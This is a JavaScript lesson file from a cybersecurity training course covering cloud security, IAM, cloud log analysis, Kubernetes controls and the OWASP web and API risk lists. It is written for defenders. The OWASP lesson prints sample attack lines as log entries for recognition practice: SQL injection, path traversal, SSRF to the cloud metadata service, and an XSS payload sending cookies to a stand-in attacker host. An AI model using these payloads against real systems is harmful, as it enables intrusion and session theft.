/* CyberPath lessons: Phase 4 (Cloud, AppSec, GRC, AI Security, Career) and Phase 5 (CISSP / Associate of ISC2) */
window.CP = window.CP || {};
CP.lessons = CP.lessons || [];

/* ===================== p4-m1 Cloud Security ===================== */
CP.lessons.push(
{
  id: "p4-m1-l1",
  module: "p4-m1",
  title: "Cloud Models and the Shared Responsibility Model",
  minutes: 15,
  objectives: [
    "Distinguish IaaS, PaaS, SaaS and serverless service models",
    "Explain who secures what under the shared responsibility model",
    "Describe public, private, hybrid and multi-cloud deployment models",
    "Identify the most common root causes of cloud breaches"
  ],
  html: `
<p>Almost every organization you will defend as an analyst runs at least part of its estate in the cloud. The first thing to understand is that "the cloud" does not move responsibility away from you; it <em>splits</em> it. Knowing exactly where that split falls is what lets you triage a cloud alert correctly and avoid the classic mistake of assuming "the provider handles security."</p>

<h3>Service models</h3>
<p>NIST SP 800-145 defines the three classic service models. Modern clouds add serverless and containers-as-a-service, which sit between IaaS and PaaS.</p>
<table>
<thead><tr><th>Model</th><th>You get</th><th>Examples</th><th>You still secure</th></tr></thead>
<tbody>
<tr><td>IaaS</td><td>Virtual machines, networks, storage</td><td>AWS EC2, Azure Virtual Machines, Google Compute Engine</td><td>Guest OS, patching, firewall rules, apps, data, identities</td></tr>
<tr><td>PaaS</td><td>A managed runtime or database</td><td>Azure App Service, AWS RDS, Google Cloud SQL</td><td>Application code, configuration, data, access</td></tr>
<tr><td>Serverless / FaaS</td><td>Run code on events with no servers to manage</td><td>AWS Lambda, Azure Functions</td><td>Function code, dependencies, IAM role of the function, secrets</td></tr>
<tr><td>SaaS</td><td>A finished application</td><td>Microsoft 365, Salesforce, Google Workspace</td><td>Users, MFA, sharing settings, data classification, integrations</td></tr>
</tbody>
</table>

<h3>The shared responsibility model</h3>
<p>AWS summarizes it as: the provider is responsible for security <strong>"of"</strong> the cloud (data centers, hardware, hypervisor, the global network), and the customer is responsible for security <strong>"in"</strong> the cloud. Microsoft and Google publish equivalent diagrams. The higher you move up the stack (IaaS to SaaS), the more the provider handles, but three things <strong>never</strong> transfer to the provider:</p>
<ul>
<li><strong>Your data</strong> and how it is classified, shared and encrypted.</li>
<li><strong>Your identities and access</strong>: who can log in, with what permissions, and whether MFA is enforced.</li>
<li><strong>Your configuration choices</strong>: a public S3 bucket or an "Anyone with the link" SharePoint file is a customer decision.</li>
</ul>

<div class="callout warn"><strong>The real threat is misconfiguration.</strong> Industry breach reports year after year find that the overwhelming majority of cloud incidents trace back to customer-side issues: exposed storage, overly permissive IAM, leaked access keys in code repositories, and missing MFA. Hypervisor escapes are rare headlines; leaked keys are a daily event.</div>

<h3>Deployment models</h3>
<ul>
<li><strong>Public cloud</strong>: multi-tenant infrastructure owned by a provider (AWS, Azure, GCP, Oracle).</li>
<li><strong>Private cloud</strong>: cloud-style infrastructure dedicated to one organization, on-premises or hosted.</li>
<li><strong>Hybrid cloud</strong>: on-premises plus public cloud connected together (VPN, Direct Connect, ExpressRoute). Identity is usually the bridge, for example on-prem Active Directory synced to Microsoft Entra ID.</li>
<li><strong>Multi-cloud</strong>: using more than one public provider. Great for resilience, hard for visibility because each provider has different logs, IAM and terminology.</li>
<li><strong>Community cloud</strong>: shared by organizations with common requirements, such as government clouds (AWS GovCloud, Azure Government).</li>
</ul>

<h3>Translating terminology across providers</h3>
<table>
<thead><tr><th>Concept</th><th>AWS</th><th>Azure</th><th>Google Cloud</th></tr></thead>
<tbody>
<tr><td>Control-plane audit log</td><td>CloudTrail</td><td>Activity Log</td><td>Cloud Audit Logs</td></tr>
<tr><td>Identity service</td><td>IAM / IAM Identity Center</td><td>Microsoft Entra ID</td><td>Cloud IAM</td></tr>
<tr><td>Native threat detection</td><td>GuardDuty</td><td>Microsoft Defender for Cloud</td><td>Security Command Center</td></tr>
<tr><td>Network isolation</td><td>VPC, Security Groups, NACLs</td><td>VNet, NSGs</td><td>VPC, firewall rules</td></tr>
<tr><td>Object storage</td><td>S3</td><td>Blob Storage</td><td>Cloud Storage</td></tr>
<tr><td>Key management</td><td>KMS</td><td>Key Vault</td><td>Cloud KMS</td></tr>
</tbody>
</table>

<h3>The control plane vs the data plane</h3>
<p>In the cloud, the API is the new perimeter. The <strong>control plane</strong> is the management API that creates, modifies and deletes resources (CreateUser, PutBucketPolicy, RunInstances). The <strong>data plane</strong> is the actual use of a resource (reading an object, querying a database). An attacker with stolen credentials does not need to "hack" a server: they call the control-plane API to create a new access key, open a security group, or snapshot a disk and share it to their own account. That is why control-plane logs are the most important cloud log source for a SOC.</p>

<div class="callout real"><strong>On the job:</strong> A common Tier 1 cloud ticket is "public bucket detected." Your first questions: Is it intentionally public (a static website)? What data is in it? Who changed the policy and when (check CloudTrail for PutBucketPolicy or PutBucketAcl)? Was any data accessed from unknown IPs (S3 server access logs or data events)? Escalate if sensitive data was exposed.</div>

<div class="callout tip">The Cloud Security Alliance (CSA) publishes the Cloud Controls Matrix (CCM) and the Security Guidance, both free. The CCSK certificate is a well-regarded vendor-neutral starting point if you want to specialize in cloud.</div>

<div class="callout exam"><strong>CISSP Domain 3 and Security+:</strong> Expect questions where the answer hinges on the service model. In SaaS, the customer is still accountable for data and user access. Accountability can never be outsourced, even when responsibility for operating controls is.</div>
`,
  keyTerms: [
    ["Shared responsibility model", "Division of security duties: provider secures the cloud itself, customer secures what they put in it"],
    ["IaaS", "Infrastructure as a Service: rented VMs, storage and networks; customer manages OS upward"],
    ["PaaS", "Platform as a Service: managed runtime or database; customer manages code, config and data"],
    ["SaaS", "Software as a Service: finished application; customer manages users, settings and data"],
    ["Control plane", "The management API used to create and configure cloud resources"],
    ["Multi-cloud", "Using more than one public cloud provider"]
  ],
  standards: ["NIST SP 800-145", "NIST SP 800-210", "CSA Cloud Controls Matrix v4"]
},
{
  id: "p4-m1-l2",
  module: "p4-m1",
  title: "Cloud IAM and Least Privilege",
  minutes: 18,
  objectives: [
    "Read an AWS IAM policy and explain what it allows",
    "Explain the difference between users, roles, groups and service accounts",
    "Apply least privilege using roles, temporary credentials and guardrails",
    "Recognize dangerous IAM permissions used for privilege escalation"
  ],
  html: `
<p>In the cloud, identity is the perimeter. If an attacker gets valid credentials with broad permissions, network firewalls barely matter because every action is an authenticated API call. Cloud IAM is therefore the single most important control you will review.</p>

<h3>Identity building blocks</h3>
<table>
<thead><tr><th>Concept</th><th>AWS</th><th>Azure / Entra ID</th><th>Notes</th></tr></thead>
<tbody>
<tr><td>Human identity</td><td>IAM user or IAM Identity Center user</td><td>Entra ID user</td><td>Prefer federated SSO with MFA over long-lived local users</td></tr>
<tr><td>Workload identity</td><td>IAM role (assumed by EC2, Lambda)</td><td>Managed identity, service principal</td><td>Gets short-lived credentials automatically</td></tr>
<tr><td>Grouping</td><td>IAM group</td><td>Entra group</td><td>Assign permissions to groups, not individuals</td></tr>
<tr><td>Permission set</td><td>IAM policy (JSON)</td><td>Azure RBAC role definition</td><td>Built-in roles are often broader than needed</td></tr>
<tr><td>Org guardrail</td><td>Service Control Policy (SCP)</td><td>Azure Policy, management groups</td><td>Limits the maximum permissions anyone can have</td></tr>
</tbody>
</table>

<h3>Reading an AWS IAM policy</h3>
<p>Every AWS policy statement has an <strong>Effect</strong> (Allow or Deny), <strong>Action</strong> (API calls), <strong>Resource</strong> (ARNs) and optional <strong>Condition</strong>.</p>
<pre><code>{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": ["s3:GetObject"],
    "Resource": "arn:aws:s3:::finance-reports/*",
    "Condition": { "Bool": { "aws:MultiFactorAuthPresent": "true" } }
  }]
}</code></pre>
<p>This allows reading objects only in the finance-reports bucket, and only when the session used MFA. Compare it with the policy you will see far too often in real environments:</p>
<pre><code>{ "Effect": "Allow", "Action": "*", "Resource": "*" }</code></pre>
<p>That is full administrator access. If it is attached to an access key sitting in a developer laptop or a CI pipeline, the blast radius of a leak is the entire account.</p>

<h4>How AWS evaluates permissions</h4>
<ol>
<li>By default, everything is <strong>implicitly denied</strong>.</li>
<li>An <strong>explicit Deny</strong> anywhere (identity policy, resource policy, SCP, permission boundary) always wins.</li>
<li>Otherwise, the request is allowed only if some applicable policy explicitly <strong>Allows</strong> it and no guardrail (SCP, boundary, session policy) blocks it.</li>
</ol>

<h3>Least privilege in practice</h3>
<ul>
<li><strong>Use roles and temporary credentials.</strong> AWS STS credentials expire (default one hour for many sessions). Long-lived access keys (starting with AKIA) are the number one cloud leak; temporary keys start with ASIA.</li>
<li><strong>Federate humans.</strong> Use IAM Identity Center or Entra ID SSO with phishing-resistant MFA instead of creating IAM users.</li>
<li><strong>Protect the root / Global Administrator.</strong> Enable MFA, remove root access keys, and use it only for break-glass tasks.</li>
<li><strong>Right-size with data.</strong> AWS IAM Access Analyzer can generate a policy from actual CloudTrail activity and flag unused permissions; Entra has access reviews and Privileged Identity Management (PIM) for just-in-time elevation.</li>
<li><strong>Apply guardrails.</strong> SCPs such as "deny disabling CloudTrail" or "deny actions outside approved regions" stop mistakes and attackers even if an admin role is compromised.</li>
<li><strong>Use conditions.</strong> Restrict by source IP, VPC endpoint, MFA, time, or resource tags (attribute-based access control).</li>
</ul>

<div class="callout warn"><strong>Privilege escalation permissions.</strong> Some permissions look harmless but let a user grant themselves more: <code>iam:CreatePolicyVersion</code>, <code>iam:AttachUserPolicy</code>, <code>iam:PassRole</code> combined with <code>lambda:CreateFunction</code> or <code>ec2:RunInstances</code>, <code>iam:CreateAccessKey</code> on other users, and <code>sts:AssumeRole</code> into a more privileged role. Treat these as admin-equivalent during reviews.</div>

<h3>Workload identity and metadata services</h3>
<p>EC2 instances get role credentials from the Instance Metadata Service at 169.254.169.254. A server-side request forgery (SSRF) bug can trick an application into fetching those credentials, which is exactly what happened in the 2019 Capital One breach. <strong>IMDSv2</strong> requires a session token obtained with a PUT request, which blocks most SSRF-based theft. Enforce IMDSv2 on all instances.</p>

<div class="callout real"><strong>On the job:</strong> When GitHub secret scanning or a GuardDuty finding reports an exposed access key, the playbook is: (1) identify the key owner, (2) deactivate the key immediately, (3) review CloudTrail for every API call made with that access key ID, looking for CreateUser, CreateAccessKey, RunInstances in unusual regions (crypto mining), and data access, (4) remove any persistence the attacker created, (5) rotate and move the workload to a role.</div>

<div class="callout tip">Practice reading policies until you can answer "what can this identity do, to which resources, under which conditions?" in under a minute. That skill alone sets you apart in cloud security interviews.</div>

<div class="callout exam"><strong>CISSP Domain 5:</strong> Least privilege, need to know, and separation of duties apply identically in the cloud. Conditions on tags are an example of ABAC; built-in roles are RBAC.</div>
`,
  keyTerms: [
    ["Least privilege", "Granting only the minimum permissions required to perform a task"],
    ["IAM role", "An identity with permissions that is assumed temporarily and issues short-lived credentials"],
    ["Service Control Policy", "AWS Organizations guardrail that caps the maximum permissions in member accounts"],
    ["Explicit deny", "A Deny statement that overrides any Allow in AWS policy evaluation"],
    ["IMDSv2", "Session-token-based instance metadata service that mitigates SSRF credential theft"],
    ["Privileged Identity Management", "Entra ID feature for just-in-time, time-bound, approved role activation"]
  ],
  standards: ["NIST SP 800-207", "CIS AWS Foundations Benchmark", "CIS Microsoft Azure Foundations Benchmark"],
  labs: ["lab-cloud-iam"]
},
{
  id: "p4-m1-l3",
  module: "p4-m1",
  title: "Cloud Logging and Detection: CloudTrail, GuardDuty and Entra ID Sign-in Logs",
  minutes: 20,
  objectives: [
    "Identify the key fields in an AWS CloudTrail event",
    "Interpret common Amazon GuardDuty finding types",
    "Analyze Microsoft Entra ID sign-in logs and error codes",
    "Write simple KQL to hunt for suspicious sign-ins"
  ],
  html: `
<p>A SOC analyst's cloud work is mostly log work. This lesson covers the three log sources you will use most: AWS CloudTrail, Amazon GuardDuty findings, and Microsoft Entra ID sign-in logs.</p>

<h3>AWS CloudTrail</h3>
<p>CloudTrail records API calls made in an AWS account. <strong>Management events</strong> (control-plane actions like CreateUser) are logged by default and viewable for 90 days in Event history. To keep logs longer and capture everything, create an <strong>organization trail</strong> delivering to a locked-down S3 bucket in a separate log-archive account. <strong>Data events</strong> (S3 GetObject, Lambda Invoke) are high-volume and must be enabled explicitly.</p>
<pre><code>{
  "eventTime": "2026-09-14T03:12:44Z",
  "eventSource": "iam.amazonaws.com",
  "eventName": "CreateAccessKey",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "185.220.101.7",
  "userAgent": "aws-cli/2.15.0 Python/3.11 Linux",
  "userIdentity": {
    "type": "IAMUser",
    "userName": "ci-deploy",
    "accessKeyId": "AKIA..."
  },
  "requestParameters": { "userName": "backup-admin" },
  "errorCode": null
}</code></pre>
<p>Read it like a story: at 03:12 UTC, the CI deployment user, calling from a Tor exit-node IP with the CLI, created a new access key for a <em>different</em> user called backup-admin. That is a textbook persistence move and should be escalated immediately.</p>

<h4>High-value CloudTrail events to alert on</h4>
<table>
<thead><tr><th>Event</th><th>Why it matters</th></tr></thead>
<tbody>
<tr><td>StopLogging, DeleteTrail, UpdateTrail</td><td>Defense evasion: attacker blinding you (ATT&amp;CK T1562.008)</td></tr>
<tr><td>ConsoleLogin without MFA, or root ConsoleLogin</td><td>Credential misuse; root should almost never log in</td></tr>
<tr><td>CreateUser, CreateAccessKey, CreateLoginProfile</td><td>Persistence</td></tr>
<tr><td>AttachUserPolicy, PutUserPolicy, CreatePolicyVersion</td><td>Privilege escalation</td></tr>
<tr><td>PutBucketPolicy, PutBucketAcl, DeletePublicAccessBlock</td><td>Data exposure</td></tr>
<tr><td>AuthorizeSecurityGroupIngress with 0.0.0.0/0</td><td>Opening the network</td></tr>
<tr><td>GetCallerIdentity from a new IP</td><td>The attacker's "whoami" after stealing keys</td></tr>
<tr><td>ModifySnapshotAttribute, CreateSnapshot sharing</td><td>Exfiltration of disks to another account</td></tr>
</tbody>
</table>

<h3>Amazon GuardDuty</h3>
<p>GuardDuty is a managed threat detection service that analyzes CloudTrail, VPC Flow Logs and DNS logs (plus optional S3, EKS, RDS, Lambda, runtime and malware protection). Findings follow the format <code>ThreatPurpose:ResourceType/ThreatFamily.Detail</code>.</p>
<table>
<thead><tr><th>Finding</th><th>Meaning</th></tr></thead>
<tbody>
<tr><td>UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS</td><td>EC2 role credentials are being used from outside AWS: likely stolen via SSRF or a compromised host</td></tr>
<tr><td>CryptoCurrency:EC2/BitcoinTool.B!DNS</td><td>Instance is querying crypto mining pool domains</td></tr>
<tr><td>Recon:IAMUser/MaliciousIPCaller</td><td>Discovery API calls from a known-bad IP</td></tr>
<tr><td>Stealth:IAMUser/CloudTrailLoggingDisabled</td><td>Someone turned off logging</td></tr>
<tr><td>Policy:IAMUser/RootCredentialUsage</td><td>Root credentials were used</td></tr>
</tbody>
</table>
<p>Severity is Low, Medium, High or Critical. GuardDuty Extended Threat Detection also correlates multiple signals into "attack sequence" findings that map to MITRE ATT&amp;CK. Findings flow to AWS Security Hub and EventBridge, which is how they reach your SIEM.</p>

<h3>Microsoft Entra ID sign-in logs</h3>
<p>Entra ID (formerly Azure AD) is the identity provider for Microsoft 365 and Azure. Sign-in logs come in four categories: <strong>interactive user</strong>, <strong>non-interactive user</strong> (token refreshes by apps), <strong>service principal</strong>, and <strong>managed identity</strong>. Key fields: user, app, IP, location, device, client app, Conditional Access result, risk level, and result/error code.</p>
<table>
<thead><tr><th>Error code</th><th>Meaning</th></tr></thead>
<tbody>
<tr><td>0</td><td>Success</td></tr>
<tr><td>50126</td><td>Invalid username or password</td></tr>
<tr><td>50053</td><td>Account locked (smart lockout) or sign-in from a malicious IP blocked</td></tr>
<tr><td>50074 / 50076</td><td>Strong authentication (MFA) required</td></tr>
<tr><td>500121</td><td>MFA failed or was denied by the user</td></tr>
<tr><td>53003</td><td>Blocked by Conditional Access</td></tr>
</tbody>
</table>
<p>Hunting with KQL in Microsoft Sentinel or Defender XDR, for a password spray (many users, few attempts each, from one IP):</p>
<pre><code>SigninLogs
| where TimeGenerated &gt; ago(1d)
| where ResultType == "50126"
| summarize Users = dcount(UserPrincipalName), Attempts = count() by IPAddress
| where Users &gt; 20
| order by Users desc</code></pre>

<div class="callout warn"><strong>MFA fatigue and token theft.</strong> A run of 500121 errors followed by a success (0) for the same user is a sign of MFA push bombing. A successful sign-in with no MFA prompt from a new country, using a token, can indicate adversary-in-the-middle phishing (tools like Evilginx) that stole a session cookie. Revoke sessions, reset credentials, and check for new inbox rules and OAuth app consents.</div>

<div class="callout real"><strong>On the job:</strong> "Impossible travel" alerts are noisy because of VPNs and mobile carriers. Before escalating, compare the device ID, user agent and whether MFA was satisfied. A known compliant device plus a corporate VPN egress IP is usually benign; an unknown device with a legacy protocol client is not.</div>

<div class="callout exam"><strong>SC-200 and CISSP Domain 7:</strong> Know that logs must be centralized, time-synchronized, integrity-protected and retained per policy. Disabling logging is itself a critical event.</div>
`,
  keyTerms: [
    ["CloudTrail", "AWS service that records API calls (management and optional data events)"],
    ["Organization trail", "A CloudTrail trail that logs every account in an AWS Organization to a central bucket"],
    ["GuardDuty", "AWS managed threat detection analyzing CloudTrail, VPC Flow Logs, DNS and more"],
    ["Non-interactive sign-in", "Entra ID sign-in performed by a client on the user's behalf, e.g. token refresh"],
    ["Conditional Access", "Entra ID policy engine that grants, blocks or requires MFA based on signals"],
    ["Password spray", "Trying a few common passwords against many accounts to avoid lockout"]
  ],
  standards: ["MITRE ATT&CK Cloud Matrix", "NIST SP 800-92"]
},
{
  id: "p4-m1-l4",
  module: "p4-m1",
  title: "CSPM, CNAPP, Containers and Kubernetes Basics",
  minutes: 18,
  objectives: [
    "Explain what CSPM, CWPP, CIEM and CNAPP tools do",
    "Describe how containers differ from virtual machines",
    "Identify core Kubernetes security controls",
    "List common container and Kubernetes attack paths"
  ],
  html: `
<p>Cloud environments change thousands of times a day. Humans cannot review every change, so a family of tools continuously checks configuration and workloads. You will hear their acronyms constantly.</p>

<h3>The cloud security tool alphabet</h3>
<table>
<thead><tr><th>Acronym</th><th>Stands for</th><th>What it does</th></tr></thead>
<tbody>
<tr><td>CSPM</td><td>Cloud Security Posture Management</td><td>Scans cloud configuration against benchmarks (CIS, PCI) and flags misconfigurations like public buckets or open ports</td></tr>
<tr><td>CWPP</td><td>Cloud Workload Protection Platform</td><td>Protects running workloads: VMs, containers, serverless (vulnerabilities, runtime threats, malware)</td></tr>
<tr><td>CIEM</td><td>Cloud Infrastructure Entitlement Management</td><td>Analyzes identities and effective permissions to find excessive privilege</td></tr>
<tr><td>DSPM</td><td>Data Security Posture Management</td><td>Discovers and classifies sensitive data across cloud stores</td></tr>
<tr><td>KSPM</td><td>Kubernetes Security Posture Management</td><td>CSPM for Kubernetes cluster configuration</td></tr>
<tr><td>CNAPP</td><td>Cloud-Native Application Protection Platform</td><td>Unifies CSPM, CWPP, CIEM, and often IaC scanning and DSPM, correlating them into attack paths</td></tr>
</tbody>
</table>
<p>Native options include Microsoft Defender for Cloud, AWS Security Hub (with its CSPM controls), and Google Security Command Center. Commercial CNAPPs include Wiz, Palo Alto Prisma Cloud, CrowdStrike Falcon Cloud Security, and others. The key value of a CNAPP is <strong>context</strong>: a vulnerable VM is a medium risk, but a vulnerable VM that is internet-exposed and has an IAM role that can read the customer database is a critical "toxic combination."</p>

<div class="callout tip"><strong>Shift left with Infrastructure as Code.</strong> Most cloud resources are now defined in Terraform, CloudFormation, Bicep or Kubernetes YAML. Scanning these files in the pull request (tools like Checkov, tfsec/Trivy, KICS) catches misconfiguration before it is deployed, which is far cheaper than fixing it in production.</div>

<h3>Containers vs virtual machines</h3>
<p>A VM virtualizes hardware and runs a full guest OS on a hypervisor. A container packages an application and its dependencies and shares the host's kernel, isolated by Linux namespaces (what it can see) and cgroups (what resources it can use). Containers start in seconds and are small, but the shared kernel means isolation is weaker than a VM.</p>
<ul>
<li><strong>Image</strong>: a read-only template built from a Dockerfile, stored in a registry (ECR, ACR, Docker Hub).</li>
<li><strong>Container</strong>: a running instance of an image.</li>
<li>Images should be minimal (distroless or slim base), scanned for CVEs, signed (Sigstore cosign), and pulled only from trusted registries.</li>
</ul>

<h3>Kubernetes in five minutes</h3>
<p>Kubernetes (K8s) orchestrates containers across a cluster. The <strong>control plane</strong> includes the API server (everything goes through it), etcd (the key-value store of all cluster state, including Secrets), the scheduler and controllers. <strong>Worker nodes</strong> run the kubelet and pods. A <strong>pod</strong> is one or more containers sharing a network namespace. Managed services (EKS, AKS, GKE) run the control plane for you, but you still secure workloads, RBAC and network policy.</p>

<h4>Core Kubernetes security controls</h4>
<table>
<thead><tr><th>Control</th><th>Purpose</th></tr></thead>
<tbody>
<tr><td>RBAC (Roles, ClusterRoles, bindings)</td><td>Least privilege for users and service accounts on the API server</td></tr>
<tr><td>Pod Security Standards (Privileged, Baseline, Restricted) via Pod Security Admission</td><td>Block privileged containers, host mounts, running as root</td></tr>
<tr><td>NetworkPolicies</td><td>By default every pod can talk to every pod; policies create segmentation</td></tr>
<tr><td>Secrets encryption at rest and external secret stores</td><td>Kubernetes Secrets are only base64-encoded by default, not encrypted</td></tr>
<tr><td>Audit logging</td><td>Records API server requests for detection and investigation</td></tr>
<tr><td>Admission control (OPA Gatekeeper, Kyverno)</td><td>Enforce policy such as "only signed images from our registry"</td></tr>
<tr><td>Runtime detection (Falco, EDR for containers)</td><td>Alert on shells spawned in containers, unexpected processes</td></tr>
</tbody>
</table>

<div class="callout warn"><strong>Common attack paths:</strong> an exposed Kubernetes dashboard or kubelet API; a container running as privileged with the host filesystem mounted (container escape); a service account token with cluster-admin automatically mounted into a web pod; secrets hard-coded in images; and crypto-mining deployments created through stolen kubeconfig files. The MITRE ATT&amp;CK Containers matrix and the Microsoft Threat Matrix for Kubernetes catalog these.</div>

<div class="callout real"><strong>On the job:</strong> If an alert says "shell spawned in container" (for example Falco's Terminal shell in container rule), check: which pod and namespace, which image, which user, what commands followed. Legitimate debugging by an engineer via kubectl exec happens, so correlate with the Kubernetes audit log to see who ran the exec.</div>

<div class="callout exam"><strong>CISSP Domain 3:</strong> Know virtualization risks (VM escape, VM sprawl), containerization, serverless, and microservices as architecture concepts. The exam is vendor-neutral, so think in terms of isolation, least privilege and secure configuration rather than product names.</div>
`,
  keyTerms: [
    ["CSPM", "Continuous scanning of cloud configuration for misconfigurations and compliance drift"],
    ["CNAPP", "Platform unifying posture, workload, identity and code security for cloud-native apps"],
    ["Container", "Isolated process sharing the host kernel, built from an image"],
    ["Pod", "Smallest deployable Kubernetes unit: one or more containers sharing network and storage"],
    ["NetworkPolicy", "Kubernetes object restricting which pods can communicate"],
    ["Infrastructure as Code", "Defining infrastructure in version-controlled templates such as Terraform"]
  ],
  standards: ["CIS Kubernetes Benchmark", "NIST SP 800-190", "NSA/CISA Kubernetes Hardening Guide"]
}
);

/* ===================== p4-m2 Application & API Security ===================== */
CP.lessons.push(
{
  id: "p4-m2-l1",
  module: "p4-m2",
  title: "The OWASP Top 10 (2025 Edition)",
  minutes: 20,
  objectives: [
    "List the ten categories of the OWASP Top 10:2025",
    "Explain what changed from the 2021 edition",
    "Recognize each category from a log entry or code example",
    "Match each risk to its primary defense"
  ],
  html: `
<p>The OWASP Top 10 is the most widely referenced awareness document for web application risk. It is built from contributed vulnerability data plus a community survey. The 2025 edition, released in late 2025, is the current version, replacing the 2021 list. Auditors, PCI DSS assessors and secure coding training all reference it.</p>

<h3>The 2025 list</h3>
<table>
<thead><tr><th>#</th><th>Category</th><th>Plain-English meaning</th><th>Primary defense</th></tr></thead>
<tbody>
<tr><td>A01</td><td>Broken Access Control</td><td>Users can act outside their permissions: viewing other users' records (IDOR), forced browsing to /admin. SSRF is now folded into this category.</td><td>Deny by default; server-side authorization checks on every request</td></tr>
<tr><td>A02</td><td>Security Misconfiguration</td><td>Default credentials, verbose errors, open cloud storage, unnecessary features, missing security headers</td><td>Hardened, automated, repeatable configuration</td></tr>
<tr><td>A03</td><td>Software Supply Chain Failures</td><td>Vulnerable or malicious dependencies, compromised build systems, untrusted update channels (expanded from 2021's "Vulnerable and Outdated Components")</td><td>SCA, SBOMs, signed artifacts, pinned dependencies, hardened CI/CD</td></tr>
<tr><td>A04</td><td>Cryptographic Failures</td><td>Sensitive data unencrypted, weak algorithms (MD5, SHA-1 for passwords), poor key handling</td><td>TLS 1.2+/1.3, strong algorithms, proper password hashing (Argon2id, bcrypt)</td></tr>
<tr><td>A05</td><td>Injection</td><td>Untrusted input interpreted as code or commands: SQL, OS command, LDAP; cross-site scripting (XSS) is included here</td><td>Parameterized queries, output encoding, input validation</td></tr>
<tr><td>A06</td><td>Insecure Design</td><td>Flaws in the design itself, such as no rate limit on a password reset flow</td><td>Threat modeling, secure design patterns, abuse cases</td></tr>
<tr><td>A07</td><td>Authentication Failures</td><td>Credential stuffing allowed, weak passwords, broken session handling, missing MFA</td><td>MFA, breached-password checks, secure session management</td></tr>
<tr><td>A08</td><td>Software or Data Integrity Failures</td><td>Trusting code or data without verifying integrity: insecure deserialization, unsigned updates</td><td>Digital signatures, integrity checks, safe deserialization</td></tr>
<tr><td>A09</td><td>Security Logging and Alerting Failures</td><td>Attacks happen but no one is told: missing logs, no alerting, logs not monitored</td><td>Log security events, centralize, alert, and act</td></tr>
<tr><td>A10</td><td>Mishandling of Exceptional Conditions</td><td>New in 2025: improper error handling, failing open, logic errors under abnormal conditions</td><td>Fail securely (closed), consistent error handling, test edge cases</td></tr>
</tbody>
</table>

<div class="callout tip"><strong>What changed from 2021:</strong> Security Misconfiguration jumped to #2; supply chain risk was broadened into its own top-three category; SSRF (A10 in 2021) was merged into Broken Access Control; Logging "and Monitoring" became Logging "and Alerting" to stress that logs nobody acts on are useless; and Mishandling of Exceptional Conditions is brand new.</div>

<h3>Recognizing attacks in the logs</h3>
<p>As a SOC analyst you rarely read source code, but you constantly read web server and WAF logs. Practice spotting these patterns:</p>
<pre><code>GET /api/orders/10442 HTTP/1.1   (user 381)   200
GET /api/orders/10443 HTTP/1.1   (user 381)   200
GET /api/orders/10444 HTTP/1.1   (user 381)   200     &lt;-- sequential IDs: possible IDOR (A01)

GET /products?id=5' OR '1'='1 HTTP/1.1                 &lt;-- SQL injection (A05)
GET /search?q=&lt;script&gt;document.location='//evil.tld/?c='+document.cookie&lt;/script&gt;   &lt;-- reflected XSS (A05)
GET /download?file=../../../../etc/passwd             &lt;-- path traversal (A01)
POST /fetch-image  url=http://169.254.169.254/latest/meta-data/   &lt;-- SSRF to cloud metadata (A01)</code></pre>

<h3>Injection, the classic example</h3>
<p>Vulnerable code concatenates input directly into a query:</p>
<pre><code>query = "SELECT * FROM users WHERE name = '" + username + "'"</code></pre>
<p>If the username is <code>admin' --</code>, the rest of the query is commented out. The fix is a parameterized query, where the database driver treats input strictly as data:</p>
<pre><code>cursor.execute("SELECT * FROM users WHERE name = %s", (username,))</code></pre>

<div class="callout warn"><strong>A WAF is not a fix.</strong> A web application firewall can block known payloads and buy time (virtual patching), but attackers routinely bypass signatures with encoding tricks. The durable fix is in the code. Report WAF blocks to the application team so the root cause gets addressed.</div>

<div class="callout real"><strong>On the job:</strong> A 200 response to a SQL injection attempt does not prove compromise, and a 500 does not prove failure. Look at response sizes: a normal product page might return 4 KB, while a successful UNION-based injection dumping a table might return 400 KB. Correlate with database logs if available.</div>

<h3>Beyond the Top 10</h3>
<p>The Top 10 is an awareness document, not a testing standard. For verification, OWASP publishes the <strong>Application Security Verification Standard (ASVS)</strong>, with version 5.0 released in 2025, which defines testable requirements at three levels. The <strong>Web Security Testing Guide (WSTG)</strong> describes how to test, and the <strong>Cheat Sheet Series</strong> gives developers concise fixes.</p>

<div class="callout exam"><strong>CISSP Domain 8 and Security+:</strong> You will be asked to identify an attack from a snippet (SQLi, XSS, CSRF, directory traversal) and pick the best mitigation. Input validation helps, but parameterized queries are the BEST answer for SQL injection, and output encoding is the BEST answer for XSS.</div>
`,
  keyTerms: [
    ["OWASP Top 10", "Consensus list of the most critical web application security risks; current edition 2025"],
    ["IDOR", "Insecure Direct Object Reference: accessing another user's object by changing an identifier"],
    ["Parameterized query", "Database query where input is bound as data, preventing SQL injection"],
    ["XSS", "Cross-site scripting: injecting script that runs in another user's browser"],
    ["SSRF", "Server-side request forgery: making the server fetch attacker-chosen URLs"],
    ["ASVS", "OWASP Application Security Verification Standard, testable security requirements"]
  ],
  standards: ["OWASP Top 10:2025", "OWASP ASVS 5.0", "OWASP WSTG", "CWE"],
  labs: ["lab-owasp-web"]
},
{
  id: "p4-m2-l2",
  module: "p4-m2",
  title: "API Security: The OWASP API Security Top 10 (2023)",
  minutes: 18,
  objectives: [
    "List the ten risks in the OWASP API Security Top 10 2023",
    "Distinguish BOLA, BOPLA and BFLA",
    "Explain how APIs authenticate with tokens and keys",
    "Describe API security controls such as gateways, schemas and inventory"
  ],
  html: `
<p>Modern applications are mostly APIs: the mobile app, the single-page web front end, and partner integrations all call REST or GraphQL endpoints that return JSON. APIs expose business logic and data directly, so their risks differ from classic web pages. OWASP maintains a separate list, the API Security Top 10, with the 2023 edition current.</p>

<h3>The 2023 list</h3>
<table>
<thead><tr><th>#</th><th>Risk</th><th>Example</th></tr></thead>
<tbody>
<tr><td>API1</td><td>Broken Object Level Authorization (BOLA)</td><td>GET /api/v1/accounts/7781 returns someone else's account when you change the ID</td></tr>
<tr><td>API2</td><td>Broken Authentication</td><td>No rate limiting on login, JWTs accepted with "alg":"none", tokens that never expire</td></tr>
<tr><td>API3</td><td>Broken Object Property Level Authorization (BOPLA)</td><td>API returns the full user object including passwordHash (excessive data exposure) or lets you PATCH "role":"admin" (mass assignment)</td></tr>
<tr><td>API4</td><td>Unrestricted Resource Consumption</td><td>No limits on page size, upload size, or calls to an expensive SMS or AI endpoint</td></tr>
<tr><td>API5</td><td>Broken Function Level Authorization (BFLA)</td><td>A normal user can call DELETE /api/admin/users/12</td></tr>
